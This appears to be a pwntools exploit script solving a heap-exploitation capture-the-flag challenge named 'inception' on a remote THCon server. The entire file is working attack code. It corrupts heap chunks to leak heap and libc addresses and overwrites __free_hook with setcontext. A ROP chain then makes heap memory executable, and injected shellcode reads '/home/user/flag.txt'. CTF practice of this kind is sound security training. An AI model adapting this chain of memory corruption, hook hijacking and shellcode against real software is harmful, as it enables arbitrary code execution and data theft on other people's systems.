from pwn import *
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './inception'
HOST = 'remote2.thcon.party'
PORT = 10904

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		# return process(TARGET)
		return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def a(size, data):
	r.sendlineafter('> ', '1')
	r.sendlineafter(': ', str(size))
	r.sendafter(': ', data)

def d(idx):
	r.sendlineafter('> ', '2')
	r.sendlineafter(': ', str(idx))

def e(idx, data):
	r.sendlineafter('> ', '3')
	r.sendlineafter(': ', str(idx))
	r.sendafter(': ', data)

def v(idx):
	r.sendlineafter('> ', '4')
	r.sendlineafter(': ', str(idx))

r = start()

a(0x428, 'A')
a(0x18, 'A')
a(0x4f8, 'A')
a(0x18, 'A')
d(0)
e(1, 'B'*0x10+p64(0x450))
d(2)

d(1)
a(0x48, '\xa0')
v(0)
a(0x48, 'a')
d(0)
d(1)
a(0x48, 'a')
v(0)
r.recvuntil('content: ')
leak = u64(r.recvuntil('\n', True).ljust(8, '\x00'))
dbg('leak')
heap = leak - 0x261
dbg('heap')
target = heap + 0xbd0
d(0)

a(0x428-0xa0, '\xa0')
v(0)
r.recvuntil('content: ')
leak = u64(r.recvuntil('\n', True).ljust(8, '\x00'))
dbg('leak')
base = leak - 0x3ebca0
dbg('base')
setcontext = base + 0x521b5
fh = base + 0x3ed8e8
syscall = base + 0x000d2745
rdx = base + 0x00001b9a
rax = base + 0x00043ca0
rsi = base + 0x00023eea
rdi = base + 0x000215bf

add_rax_rdi = base + 0x000d03df

a(0x428, p64(fh))
a(0x18, 'a')
a(0x18, p64(setcontext))
context.log_level = 'debug'

rwx = heap + 0xce0
payload = "/home/user/flag.txt"
payload = payload.ljust(0x20, '\x00')
payload = payload.ljust(0xa0, '\x11')
payload += p64(target+0xb0)
payload += flat(rdi, 1, rax, 9, add_rax_rdi, rdi, heap, rsi, 0x1000, rdx, 7, syscall)
payload += p64(rwx)
payload += asm('''
	mov rdi, {}
	xor edx, edx
	xor esi, esi
	inc eax; inc eax;
	syscall
	mov rdi, rax
	xor eax, eax
	mov rsi, {}
	mov rdx, 0x100
	syscall
	xor eax, eax; inc eax
	xor edi, edi
	inc edi;
	mov rsi, {}
	mov rdx, 0x100
	syscall
	
'''.format(target, heap + 0x300, heap+0x300))
a(0x500, payload)
if args.D:
	debug(r, [0x1656])
d(5)



r.interactive()
r.close()
